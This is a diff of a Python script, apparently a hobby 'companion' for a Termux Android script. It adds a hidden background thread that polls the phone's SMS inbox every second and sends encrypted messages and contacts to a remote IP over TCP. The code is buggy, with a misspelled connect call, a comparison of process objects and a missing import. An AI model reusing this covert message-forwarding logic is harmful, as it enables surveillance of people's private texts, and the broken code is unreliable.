@@ -1,5 +1,6 @@
 """The companion app for my Android Termux scrypt"""
 from socket import socket, AF_INET, SOCK_STREAM
+import threading
 import pyaes
 import sys
 import subprocess
@@ -44,17 +45,25 @@ def sendcontacts():
     SOCKET.send(bytes.encode(encrypt(Contacts)))
 
 
-def sendtexts():
-    TextsRaw = subprocess.Popen(['termux-sms-inbox'], stdout=subprocess.PIPE)
-    Texts = encrypt(bytes.decode(TextsRaw.communicate()[0]))
-
+def incomming_texts():
+    print('incomming_texts thread started')
     SOCKET2 = socket(AF_INET, SOCK_STREAM)
-    SOCKET2.connect((IP, PORT2))
+    SOCKET2.conenct((IP, PORT2))
+    print('connected')
 
-    SOCKET2.send(bytes.encode(encrypt(Texts)))
+    while True:
+        TextsRaw1 = subprocess.Popen(['termux-sms-inbox'], stdout=subprocess.PIPE)
+        time.sleep(1)
+        TextsRaw2 = subprocess.Popen(['termux-sms-inbox'], stdout=subprocess.PIPE)
 
-    SOCKET2.close()
+        if(TextsRaw1 != TextsRaw2):
+            Texts = encrypt(bytes.decode(TextsRaw2.communicate()[0]))
+            SOCKET.send(bytes.encode(encrypt(Texts)))
 
+
+incomming_texts_thread = threading.Thread(target=incomming_texts)
+incomming_texts_thread.daemon = True
+incomming_texts_thread.start()
 
 # Definging the serversocket variable and setting it to use the TCP protocol
 SOCKET = socket(AF_INET, SOCK_STREAM)
